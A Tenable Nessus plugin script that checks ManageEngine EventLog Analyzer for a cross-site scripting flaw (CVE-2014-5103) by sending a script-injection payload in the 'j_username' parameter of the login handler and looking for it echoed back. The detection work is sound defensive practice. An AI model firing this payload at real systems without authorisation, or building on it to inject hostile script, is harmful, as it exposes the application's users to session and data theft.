#
# (C) Tenable Network Security, Inc.
#

include("compat.inc");

if (description)
{
  script_id(77480);
  script_version("$Revision: 1.2 $");
  script_cvs_date("$Date: 2015/01/14 03:46:11 $");

  script_cve_id("CVE-2014-5103");
  script_bugtraq_id(65018, 68854);
  script_osvdb_id(102270);

  script_name(english:"ManageEngine EventLog Analyzer 'j_username' XSS");
  script_summary(english:"Tries to exploit the issue.");

  script_set_attribute(attribute:"synopsis", value:
"The remote web server hosts an application that is affected by a
cross-site scripting vulnerability.");
  script_set_attribute(attribute:"description", value:
"The remote web server fails to sanitize user-supplied input to the
'j_username' parameter of the 'j_security_check' script before using
it to generate dynamic HTML output.

An attacker can exploit this flaw to inject arbitrary HTML or script
code into a user's browser to be executed within the security context
of the affected site.

Note that the application may also be affected by an information
disclosure vulnerability, although Nessus has not tested for this.");
  script_set_attribute(attribute:"solution", value:"There is currently no known solution.");
  script_set_cvss_base_vector("CVSS2#AV:N/AC:M/Au:N/C:N/I:P/A:N");
  script_set_cvss_temporal_vector("CVSS2#E:ND/RL:U/RC:ND");
  script_set_attribute(attribute:"exploitability_ease", value:"Exploits are available");
  script_set_attribute(attribute:"exploit_available", value:"true");
  script_cwe_id(20, 74, 79, 442, 629, 711, 712, 722, 725, 750, 751, 800, 801, 809, 811, 864, 900, 928, 931, 990);

  script_set_attribute(attribute:"vuln_publication_date", value:"2013/12/12");
  script_set_attribute(attribute:"plugin_publication_date", value:"2014/09/02");

  script_set_attribute(attribute:"plugin_type", value:"remote");
  script_set_attribute(attribute:"cpe", value:"cpe:/a:zohocorp:manageengine_eventlog_analyzer");
  script_end_attributes();

  script_category(ACT_ATTACK);
  script_family(english:"CGI abuses : XSS");

  script_copyright(english:"This script is Copyright (C) 2014-2015 Tenable Network Security, Inc.");

  script_dependencies("manageengine_eventlog_analyzer_detect.nbin");
  script_require_keys("installed_sw/ManageEngine EventLog Analyzer");
  script_require_ports("Services/www", 8400);

  exit(0);
}

include("audit.inc");
include("global_settings.inc");
include("misc_func.inc");
include("http.inc");
include("url_func.inc");
include("webapp_func.inc");

app = "ManageEngine EventLog Analyzer";
get_install_count(app_name:app, exit_if_zero:TRUE);

port = get_http_port(default:8400);
install = get_single_install(app_name:app,port:port);

url = build_url(port:port, qs:install["path"]);

vurl = '/event/j_security_check?' +
       'forChecking=null&' +
       'j_password=a&' +
       'domains=Choose&' +
       'loginButton=Login&' +
       'optionValue=hide&';
xss = '"><script>alert('+"'"+SCRIPT_NAME+"'"+');</script>"';

exploited = test_cgi_xss(
  port     : port,
  dirs     : make_list(""),
  cgi      : vurl,
  no_qm    : TRUE,
  qs       : "j_username=" + urlencode(str:xss),
  pass_str : "for the user [" + xss + ']">',
  ctrl_re  : "<title>ManageEngine EventLog Analyzer [0-9.]+</title>"
);

if (!exploited) audit(AUDIT_WEB_APP_NOT_AFFECTED,app,url);
